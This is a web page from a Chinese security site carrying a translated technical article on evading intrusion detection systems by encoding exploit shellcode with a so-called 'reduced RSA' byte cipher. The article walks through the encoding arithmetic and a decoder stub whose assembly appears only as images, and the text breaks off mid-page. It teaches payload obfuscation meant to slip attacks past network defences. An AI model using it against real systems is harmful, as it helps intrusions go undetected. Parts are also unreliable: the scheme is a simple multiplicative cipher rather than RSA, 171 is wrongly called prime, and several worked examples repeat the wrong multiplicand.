<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns:wb="http://open.weibo.com/wb" xml:lang="en" lang="en">
<head>
    <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
    <meta name="viewport"
          content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no"/>
    <link rel="shortcut icon" href="http://bobao.360.cn/favicon.ico?v=1.1"/>
    <link rel="alternate" title="安全资讯" href="/rss?type=news" type="application/rss+xml"/>
    <link rel="alternate" title="安全知识" href="/rss?type=learning" type="application/rss+xml"/>
    <link rel="alternate" title="安全圈活动" href="/rss?type=activity" type="application/rss+xml"/>
    <link rel="alternate" title="所有漏洞" href="/rss?type=vul" type="application/rss+xml"/>
    <link rel="alternate" title="通用型漏洞" href="/rss?type=commonvul" type="application/rss+xml"/>
    <link rel="alternate" title="事件型漏洞" href="/rss?type=eventvul" type="application/rss+xml"/>
    <link rel="alternate" title="热门漏洞" href="/rss?type=hotvul" type="application/rss+xml"/>

        <title>【技术分享】智能逃避IDS——RSA非对称多态SHELLCODE - 安全客 - 有思想的安全新媒体</title>
    
        <meta name="keywords" content="IDS,SHELLCODE,绕过ids"/>
    
        <meta name="description" content="防火墙和入侵检测系统(IDS)是任何公司安全方面或组织内网络基础设施的基本核心。防火墙以网络信息为基础过滤流量，而IDS进行的是更深入的研究——考虑并分析在网络中循环的每个数据包的实际数据的内容。本文主要介绍如何通过RSA非对称多态shellcode绕过IDS检测。"/>
        <meta property="wb:webmaster" content="224437c7be31d633"/>

    <script type="text/javascript" src="http://s7.qhimg.com/!56caa871/xpc_sync_height.js"></script>
    <link rel="stylesheet" type="text/css" href="/css/reset.css" />
    <link rel="stylesheet" type="text/css" href="/css/common_new.css?v=4.4.2.1" />
    <link rel="stylesheet" type="text/css" href="/css/jquery.notyfy.css" />
    <link rel="stylesheet" type="text/css" href="/css/notyfy.theme.default.css" />
    <link rel="stylesheet" type="text/css" href="/css/s_common.css?v=2.2.7" media="only screen and
    (max-device-width:900px), only screen and (max-width:900px)" />
    <script type="text/javascript" src="/js/jquery.min.js?v=3.1"></script>
    <script type="text/javascript" src="/js/jquery.notyfy.js"></script>
    <script type="text/javascript" src="/js/iscroll.js"></script>
    <script src="http://js.passport.qihucdn.com/5.0.3.js"></script>
    <script type="text/javascript">
        var myScroll, myNavScroll;

        function iscrollLoaded() {
            myScroll = new IScroll('#wrapper',
                {
                    scrollX: true,
                    scrollY: false,
                    bounceEasing: 'circular',
                    eventPassthrough: true,
                    preventDefault: false,
                    bounceTime: 500
                }
            );
        }

        $(function () {

            //导航横向滚动


            function setNavWidth() {

                /* 计算导航宽度 */
                var allWidth = $(window).width();
                var scroller = $('#scroller');

                if (allWidth > 900) {
                    scroller.find('ul').add(scroller.find('.scroll')).removeAttr('style');
                    scroller.css('overflow', 'visible');
                    if (myNavScroll) myNavScroll.destroy();
                } else {

                    var width = 0;
                    scroller.find('.scroll').children('ul').children('li').each(function (index, el) {
                        if (!$(this).hasClass('mobile-hide')) {
                            width += $(this).outerWidth();
                        }
                    });
                    scroller.find('ul').add(scroller.find('.scroll')).width(width);

                    if (myNavScroll) myNavScroll.destroy();

                    myNavScroll = new IScroll('#scroller', {
                        scrollX: true,
                        scrollY: false,
                        momentum: false,
                        click: true
                    });

                }

            }

            setNavWidth();
            $(window).resize(function (event) {
                setNavWidth();
            });

        });

    </script>
</head>
<body onload="iscrollLoaded();">
<div style='margin:0 auto;width:0px;height:0px;overflow:hidden;'>
    <img src=""/>
</div>

<div id="is-mobile"></div>
<div class="container">
        <div class="mobile-header">
        <div class="header clearfix">
            <div class="header-wrapper clearfix">
                <a href="/index/index" class="logo"><img class="slogan" src="/img/logo.png?v=1.5"/></a>
                                <form id="search" class="search-box" action="/search/index" method="GET">
                    <input class="keys" name="keywords" type="text" placeholder="搜索漏洞" required="required">
                    <input class="icon" type="submit" value="">
                    <input type="hidden" name="type" value=""/>
                </form>
                <div class="bug">
                    <div class="name"><span class="seled">全部</span><i class="arrow"></i></div>
                    <ul class="typelist">
                        <li data-index="3"><a href="javascript:void(0);">全部</a></li>
                        <li data-index="0"><a href="javascript:void(0);">漏洞</a></li>
                        <li data-index="1"><a href="javascript:void(0);">资讯</a></li>
                        <li data-index="2"><a href="javascript:void(0);">知识</a></li>
                    </ul>
                </div>
                                <div class="logNreg mobile-hide">
                    <div class="unlog">
                        <i></i>
                        <a href="log.html" class="log">登录</a>
                        <span>|</span>
                        <a href="reg.html" class="reg">注册</a>
                    </div>
                    <div class="loged">
                        <a href="/member/profile" class="user-center"><i></i><span class="user-name-tag">个人中心</span></a>
                        <div class="user-links">
                            <span class="arrow"></span>
                            <ul>
                                <li class="account-setting"><a href="http://i.360.cn/profile/accountmanage"
                                                               target="_blank"><i></i><span>账号设置</span></a></li>
                                <li class="alert-setting"><a href="/keywords/index"
                                                             target="_blank"><i></i><span>告警设置</span></a></li>
                                <li class="bug-alert"><a href="/myalarm/index" target="_blank"><i></i><span>漏洞告警</span></a>
                                </li>
                                <li class="my-knowl"><a href="/mylearn/index" target="_blank"><i></i><span>我的知识</span></a>
                                </li>
                                <li class="my-knowl"><a href="/mycourse/index" target="_blank"><i></i><span>我的课堂</span></a>
                                </li>
                                <li class="my-exit"><a
                                            href="http://login.360.cn/?src=pcw_adlab&op=logout&destUrl=http://bobao.360.cn"><i></i><span>退出系统</span></a>
                                </li>
                            </ul>
                        </div>

                        <a href="/message" class="message-center" target="_blank"><i></i><span>我的消息</span></a>
                        <div class="message-links">
                            <span class="arrow"></span>
                            <ul>
                                <li class="account-setting" style="display:none;"><a href="/myres/index"
                                                                                     target="_blank"><i></i><span>回复我的</span></a>
                                </li>
                                <li class="my-bug"><a href="/myvul/index"
                                                      target="_blank"><i></i><span>我的漏洞</span></a></li>
                                <!--<li class="my-bug"><a href="/myres/index" target="_blank"><i></i><span>我的评论</span></a></li>-->
                                <!--<li class="alert-setting"><a href="###" target="_blank"><i></i><span>提到我的</span></a>
                                </li>-->
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <style type="text/css">
            .nav {
                overflow: hidden;
            }

            .nav .scroll {
                width: auto;
            }
        </style>
        <div id="wrapper">
            <div id="scroller" class="nav">
                <div class="scroll">
                    <ul class="nav-list">
                        <li ><a class="link-nav"
                                                                                 href="/index/index">首页</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/vul/index">漏洞</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/introduce/list">招聘</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/news/index">资讯</a><!--<i class="arrow mobile-hide"></i>
                        <ul class="subnav-list mobile-hide">
                            <li><a class="link-subnav" href="/introduce/list">招聘</a></li>
                        </ul>
			-->
                        </li>
                        <li class="cur">
                        <a class="link-nav" href="/learning/index">知识</a><i class="arrow mobile-hide"></i>
                        <ul class="subnav-list mobile-hide">
                            <li><a class="link-subnav" href="/course/index">学院</a></li>
                        </ul>
                        </li>
                        <li ><a class="link-nav"
                                                               href="/activity/index">活动</a></li>
                        <li class="mobile-hide "><a class="link-nav"
                                                                                                   href="/ctf/index">CTF训练营</a>
                        </li>
                        <li ><a class="link-nav"
                                                               href="/interref/list">安全内参</a></li>
                        <li ><a class="link-nav" href="/app/index">APP</a></li>

                        <!--<li ><a href="/course/index">学院</a></li>-->
                        <!--<li ><a href="/introduce/list">招聘</a></li>-->
                        <!--<li  class="mobile-hide"><a href="/ctf/index">CTF训练营</a></li>-->
                    </ul>
                </div>
            </div>
        </div>
    </div>
    
    <div class="mobile-content">
        <link rel="stylesheet" type="text/css" href="/css/news.css?v=3.5" />
<link rel="stylesheet" type="text/css" href="/ue/SyntaxHighlighter/shCoreDefault.css?v=1.0" />
<style>
    p .syntaxhighlighter {
        width: 80%;
    }
</style>

<div class="cur-pos w1000">当前位置：<a href="http://bobao.360.cn/">安全客</a> &gt;&gt; 知识详情</div>

<div class="content clearfix">
    <div class="main">
        <div class="article">
            <div id="article_box">
                <h2>【技术分享】智能逃避IDS——RSA非对称多态SHELLCODE</h2>
                <div class="article-msg">
                    <span class="time">2017-03-16 14:11:09</span>
                    
                                        <span class="read">阅读：9892次</span>
                    <span><a style="display: none;" class="good" href="javascript:;"
                             data-target="/learning/good" data-value="g_3615"
                             data-type="learning">点赞(0)</a></span>
                    <span><a class="fav" href="javascript:;" data-target="/mylearning/add"
                             data-pk="3615" data-type="learning">收藏</a></span>
                                        <span><a style="margin-left: 4px;" class="fav" href="https://www.exploit-db.com/docs/41469.pdf"
                             target="_blank">来源： exploit-db.com</a></span>
                    
                    
                    <div style="margin-top:10px; ">
                        <a href="/member/contribute?uid=2794169747" style="color:#848e99;">
                            <img src="http://p1.qhmsg.com/dm/150_150_100/t00df551a583a87f4e9.jpg" data-is-avatar="true"
                                 style="border: 1px solid #d5d5d5;padding: 2px; width: 80px;height: 80px;border-radius: 43px;"/>
                        </a>

                    </div>
                    <span class="orig">作者：<a href="/member/contribute?uid=2794169747" style="color:#848e99;">华为未然实验室</a></span>
                                    </div>
                <hr size="1">
                <div class="article-msg">
                    <p><!-- JiaThis Button BEGIN -->

<!--
<span class="jiathis_style"><span class="jiathis_txt">分享到：</span>
	<a class="jiathis_button_weixin"></a>
	<a class="jiathis_button_tsina"></a>
    <a class="jiathis_button_tqq"></a>
    <a class="jiathis_button_qzone"></a>
    <a class="jiathis_button_renren"></a>
    <a class="jiathis_button_xiaoyou"></a>
    <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
</span>

-->
</p>
                </div>
                <p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><p style="margin: 0px 25px 8px; white-space: normal; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &#39;Hiragino Sans GB&#39;, &#39;Microsoft Yahei&#39;, 微软雅黑, serif; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255);"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(0, 112, 192); font-size: 18px; font-weight: 900;"><img src="http://p8.qhimg.com/t0188c4ed59bb43fb58.png" title="t0188c4ed59bb43fb58.png" alt="http://p8.qhimg.com/t0188c4ed59bb43fb58.png"/></span></p><p style="margin: 0px 25px 8px; white-space: normal; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &#39;Hiragino Sans GB&#39;, &#39;Microsoft Yahei&#39;, 微软雅黑, serif; text-indent: 2em; background-color: rgb(255, 255, 255);"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(0, 112, 192); font-size: 18px; font-weight: 900;">翻译：</span><a href="http://bobao.360.cn/member/contribute?uid=2794169747" target="_blank" textvalue="华为未然实验室" style="text-decoration: none;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px; color: rgb(0, 112, 192); font-weight: 900;">华为未然实验室</span></a></p><p style="margin: 0px 25px 8px; white-space: normal; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &#39;Hiragino Sans GB&#39;, &#39;Microsoft Yahei&#39;, 微软雅黑, serif; text-indent: 2em; background-color: rgb(255, 255, 255);"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(0, 112, 192); font-size: 18px;"><span style="font-weight: 900;">稿费：200RMB（不服你也来投稿啊！）</span></span></p><p style="margin: 0px 25px 8px; white-space: normal; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &#39;Hiragino Sans GB&#39;, &#39;Microsoft Yahei&#39;, 微软雅黑, serif; text-indent: 2em; background-color: rgb(255, 255, 255);"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(0, 112, 192); font-size: 18px;"><span style="font-weight: 900;">投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿</span></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">前言</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">防火墙和入侵检测系统(IDS)是任何公司安全方面或组织内网络基础设施的基本核心。防火墙以网络信息为基础过滤流量，而IDS进行的是更深入的研究——考虑并分析在网络中循环的每个数据包的实际数据的内容。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">要真正评估网络上的数据包，IDS需要在非常低的级别上理解在特定协议内循环的信息的类型。因此，入侵检测系统(IDS)是分析系统和网络活动，以检测是否有未授权进入和/或恶意活动的活动进程或设备。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">市场上的IDS产品琳琅满目。1998年，Ptecek和Newsham演示了如何逃避IDS，他们使用了多种技术，比如重叠shellcode片段、包封数字序列及在漏洞利用的有效载荷中插入随机数据包。这些技术在当时是可行的，因为彼时IDS处理或解释数据包的方式与网络专有系统不同。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">在解释本文提出的逃避IDS的具体方式之前，我们先简要介绍一下IDS的基本操作。IDS基本模式如下（各IDS不尽相同）：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">1.&nbsp;嗅探器读取以混杂模式连接到交换机、路由器、集线器等的镜像接口的接口的所有流量。如为嵌入式安装设备，则直接采用镜像接口本身。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">2.&nbsp;一些预处理器处理由嗅探器读取的数据，然后由规则引擎更快地处理。此外还有其他功能，比如尽量使攻击者无法规避规则引擎，我们稍后将讨论这一点。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">3.&nbsp;引擎规则和一组规则。从预处理器处理的数据包，引擎规则通过寻找与其中一个规则匹配的攻击模式传递由每一个规则处理的数据包。如果匹配，则执行规则指示的操作，通常将其视作攻击（接受）或拒绝数据包（丢弃，传递，拒绝...）。如果是确认的攻击，则通知后处理器。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">4.&nbsp;后处理器负责处理攻击，即通过电子邮件通知攻击、以纯文本或在数据库中存储攻击、阻止攻击（在这种情况下，IDS是入侵防御系统IPS），等等。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">在网络层面从全局角度解释了IDS的操作后，我们接下来简要解释一下用于逃避这些系统的可能的攻击途径。攻击途径主要有四种，还有一种虽然不是攻击途径，但作为IDS的限制，也需要介绍：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(0, 176, 80);">通过预处理器中的碎片包来逃避。在该攻击途径中有两种可能的逃避。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(0, 176, 80);">攻击中使用的编码。并非所有IDS都支持相同类型的编码（支持受攻击的服务）。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(0, 176, 80);">蠕虫多态性和变质（多态性和变质蠕虫）。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(0, 176, 80);">由预处理器处理的输入数据（不正确）解析，这可能导致拒绝服务并因此导致IDS的失效。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(0, 176, 80);">加密通信。虽然事实上这不是攻击途径，但必须加以考虑。如果攻击者和服务器受害者之间的通信被加密，则IDS不能识别任何攻击模式，这无需多言。事实上，通信被加密的原因是没有中介元素可以理解它们之间的数据。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">传统类型的IDS逃避的问题恰恰是完全了解其基础和TCP / UDP水平上这些变化的确定性。操作码水平上的对称加密便由此出现，即传统的多态性——并不总是起作用。有些公司，作为其特定目的，在模块IDS的分析引擎中进行检测。不仅考虑上述方法，而且作为主要核心的一部分，在执行的流程中考虑不同语言的脚本的聚合，这使系统管理员或安全专家可基于具体产品的嵌入式API在全部流上添加ACLS。如果可能添加启发式分析，则总结对系统的恶意攻击的检测。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">因此我们需要一种更强大的方法来帮助智能逃避IDS。本文重点介绍如何通过使用Shellcode（通过网络发送）的非对称加密的RSA实现来实现这一点。因此我们要描述一种多态shellcode的实现的新思想。在利用过程中，对于对于真正参与开发、检测及遏制攻击到低水平的计算机安全专业人员而言，这反过来可以作为保护和/或攻击的模式。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">缩减形式的RSA将被用作加密方法——将用于逃避IDS。注意，这是一个新的实现，仍需要改进。下面将详细解释如何使用提出的RSA算法执行shellcode的加密和解密。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">多态shellcode的基本概念是，在利用漏洞期间，当利用代码通过网络发送shellcode时，该操作码链被NIDS检测到。本文描述的建议是使用RSA算法来加密这个链，因为是非对称算法，所以结果字符串不会有任何相干性或逻辑，因此IDS不会知道其是一个shellcode。字符串将具有以下结构：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">1.&nbsp;用于解密字符串的操作码</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">2.&nbsp;由RSA算法加密的操作码</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">在本文中，我们将解释完整的想法和执行的测试，将按以下顺序进行解释：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">1.&nbsp;如何加密和解密shellcode的操作码</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">2.&nbsp;如何构建解密shellcode的程序，以及如何获取操作码</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">3.&nbsp;如何构建能够加密操作码（C＃.NET）的程序</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">4.&nbsp;用于验证所有算法有效而执行的本地测试</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">5.&nbsp;用于验证算法对于真正的远程利用代码确实有效而执行的远程测试</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">加密和解密操作码的算法</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">由于</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">RSA</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">已经是一个众所周知的算法，所以本文档的目的不是解释或执行其演示。以下是我们将以缩减形式使用的公式：</span></p><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">加密：</span></strong></span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">F(m, e) = me&nbsp;mod n = n = c，其中m是消息，e是公钥，c是密码。</span></p><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">解密：</span></strong></span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">F(c, d) = cd&nbsp;mod n = m</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">n = p x q，p、q = 2个数字素数</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">以下是如何加密shellcode的解释：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">将把2个素数作为基础来执行加密，要注意，这可能因加密类型的不同而各异。我们将数字3作为公钥，将171作为私钥（两者均为素数），模块256的方式是，加密数字是乘以3，取模块256时我们只取两个最低有效字节。要解密，一个数字必须乘以171，并以同样方式只取两个最低有效字节，例如：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">现在我们将使用缩减的RSA加密下一个链：\xeb\x45\c9</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">将由“\ x”（每个操作码）分隔的每对数字乘以3，且只应取前2个最低有效字节：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">\xeb--&gt;0xeb*0x3=0x2c1因此加密的号码是：&nbsp;\xc1</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">\x45--&gt;0xeb*0x3=0xcf因此加密的号码是：&nbsp;\xcf</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">\xc9--&gt;0xeb*0x3=0x25b因此加密的号码是：&nbsp;\x5b</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">因为密码模块是256，所以取2个最低有效位作为最终编码的号码。这样我们可以得出结论，加密等式如下：</span></p><pre class="brush:plain;toolbar:false">A&nbsp;=&nbsp;3(n)mod&nbsp;256</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">其中，</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">A =&nbsp;密码号</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">3 =公钥</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">破译的解释如下：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">密码号：&nbsp;\xc1 Decrypting 0xc1*0xab=0x80eb解密的号码是：\xeb</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">密码号：&nbsp;\xcf Decrypting 0xcf*0xab=0x8A45解密的号码是：&nbsp;\x45</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">密码号：&nbsp;\x5b Decrypting 0x5b*0xab=0x3cc9解密的号码是：&nbsp;\xc9</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">对于解密，数字乘以ab，因为171是十六进制的AB，正如我们在加密中所执行的，对于最终数字，解密取2个最低有效位。</span></p><pre class="brush:plain;toolbar:false">B&nbsp;=&nbsp;171(n)&nbsp;mod&nbsp;256</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">其中，</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">B =&nbsp;解密的数字</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">171 =&nbsp;私钥</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">解密程序</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">解释了</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">shellcode</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">的加密如何工作后，我们继续执行程序，在运行时执行指令来解密每个操作码。这是本文中最精妙的部分，获得</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">Shell</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">加密后（我们将在下一点解释如何自动加密所有</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">shellcode</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">），我们就必须执行能够直接在堆栈上解密它的程序。这应该用汇编程序编写，因为将在那里（在堆栈中）执行，因此在汇编程序中开发了以下程序：</span></p><p style="text-align:center"><img src="http://p3.qhimg.com/t015f8e8096017b09a3.png" title="t016faf3a9073856f75.png" alt="http://p8.qhimg.com/t016faf3a9073856f75.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">我们将进行通俗的解释，以便于理解。在上面的程序中执行的第一个动作是跳转到标签“three”，其将执行语句“call one”，这个动作保存返回地址，其将跳转到标签“one”。此地址放在注册表“esi”中，这是以前保存的地址。在随后的三行中，记录“ecx”、“eax”及“ebx”被清除，随后其当前内容将为：0x0000000。现在其被放在注册表“CL”中（数字33），这表示我们的shellcode加密的字节大小。这个例子中是33（必须针对每个shellcode更改该数字，因为每个的长度各异），现在其将被放置在寄存器“al”（解密的位置的值），这是通过用计数器“ecx”（其保存shellcode加密的长度）添加“esi”（其包含shellcode加密的原理）的地址来实现的。应该解释的是，每个操作码的解密根据所建立的技术从下到上执行。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">再次谈谈算法，在第一次运行时，程序将待解密的链编码的最后一个操作码的值放入寄存器“al”中，然后减1。为此，“CL”中的初始值必须始终至少大3个单位（以确保所有shellcode将被解密），然后，其被放置在寄存器ebx的下部，即B1，数字171，其将乘以放置在标签“four”下的shellcode加密（这是用于解密）的每个数字，然后将“bl”的内容乘以“a1”，结果放在“eax”中，我们要查找的值（两个最低有效字节）在“al”（eax的下部）中，为此，我们将“al”的内容放在当前位置：[esi ecx - 1]，被计数器（cl）递减一，并且被验证：如果不为零，则返回到标签“two”，否则继续执行程序，下一步是跳转标签“four”，这正是找到现在解密的shellcode的地方。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">在算法的这一点的重要方面是理解循环——被执行以减少在堆栈内的位置：其从加密的shellcode的末尾开始执行，直到标签“4”之前的1位置，每个交互执行操作以进行解密并用新值重写位置。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">我们获得汇编器中的程序后，我们必须获取操作码——用于nasm，程序首先在汇编器中编译，如下所示：</span></p><pre class="brush:plain;toolbar:false">$&nbsp;nasm&nbsp;muldescrifra.asm</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">然后被反汇编：</span></p><pre class="brush:plain;toolbar:false">$&nbsp;ndisasm&nbsp;muldescrifra</pre><p style="text-align:center"><img src="http://p6.qhimg.com/t014064e4a9c9277e52.png" title="t01f8ea8a1d9b6cc4f1.png" alt="http://p8.qhimg.com/t01f8ea8a1d9b6cc4f1.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">我们以这种方式获得主操作码（第二列），必须强调的是，在这部分中有“脏”代码，因为值66和67应该从最终字符串中删除，并根据新的值修改跳转，链用操作码完成：</span></p><p style="text-align:center"><img src="http://p3.qhimg.com/t01d5a4ca1de469b8b7.png" title="t01230240f59613c873.png" alt="http://p3.qhimg.com/t01230240f59613c873.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">优化操作码</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">当我们执行程序的正常写入并以这种方式编译时，我们获得的是已经提到的垃圾操作码，例如：</span></p><p style="text-align:center"><img 